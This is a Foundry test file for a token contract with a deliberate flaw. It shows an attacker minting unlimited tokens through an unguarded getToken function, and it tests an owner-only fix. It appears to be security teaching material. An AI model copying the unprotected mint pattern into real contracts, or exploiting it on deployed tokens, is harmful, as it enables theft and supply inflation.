// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/A24/UnlimitedMintToken.sol";
import "../src/A24/UnlimitedMintTokenFixed.sol";

contract UnlimitedMintTest is Test {
    UnlimitedMintToken internal vulnerableContract;
    UnlimitedMintTokenFixed internal fixedContract;

    address internal deployer = makeAddr("deployer");
    address internal attacker = makeAddr("attacker");
    address internal legitimateHolder = makeAddr("legitimateHolder");

    // --- VULNERABILITY TEST ---

    function test_Exploit_AttackerMintsInfiniteTokens() public {
        // Arrange: Deploy the contract and check initial state.
        vm.prank(deployer);
        vulnerableContract = new UnlimitedMintToken();
        uint256 initialSupply = vulnerableContract.totalSupply();
        assertEq(vulnerableContract.balances(attacker), 0);

        // Act: Attacker calls `getToken` to mint a huge amount for free.
        uint256 amountToMint = 1_000_000_000_000 ether;
        vm.prank(attacker);
        vulnerableContract.getToken(amountToMint);

        // Assert:
        // 1. Attacker's balance is now huge.
        assertEq(
            vulnerableContract.balances(attacker),
            amountToMint,
            "Attacker should have minted tokens"
        );

        // 2. The totalSupply variable was NOT updated, creating an inconsistent state.
        assertEq(
            vulnerableContract.totalSupply(),
            initialSupply,
            "Total supply should be unchanged and is now incorrect"
        );
    }

    // --- MITIGATION TESTS ---

    function test_Mitigation_AttackerCannotMintTokens() public {
        // Arrange: Deploy the fixed contract.
        vm.prank(deployer);
        fixedContract = new UnlimitedMintTokenFixed();

        // Act & Assert: Attacker's attempt to mint tokens now reverts.
        vm.prank(attacker);
        vm.expectRevert("Caller is not the owner");
        fixedContract.mint(attacker, 1_000_000 ether);

        // Final check: Attacker's balance is still 0.
        assertEq(fixedContract.balances(attacker), 0);
    }

    function test_Mitigation_OwnerCanMintTokens() public {
        // Arrange: Deploy the fixed contract.
        vm.prank(deployer);
        fixedContract = new UnlimitedMintTokenFixed();
        uint256 initialSupply = fixedContract.totalSupply();

        // Act: The legitimate owner mints new tokens.
        uint256 amountToMint = 500 ether;
        vm.prank(deployer);
        fixedContract.mint(legitimateHolder, amountToMint);

        // Assert: The new tokens were minted and totalSupply was correctly updated.
        assertEq(
            fixedContract.balances(legitimateHolder),
            amountToMint,
            "Recipient should have new tokens"
        );
        assertEq(
            fixedContract.totalSupply(),
            initialSupply + amountToMint,
            "Total supply should be updated"
        );
    }
}
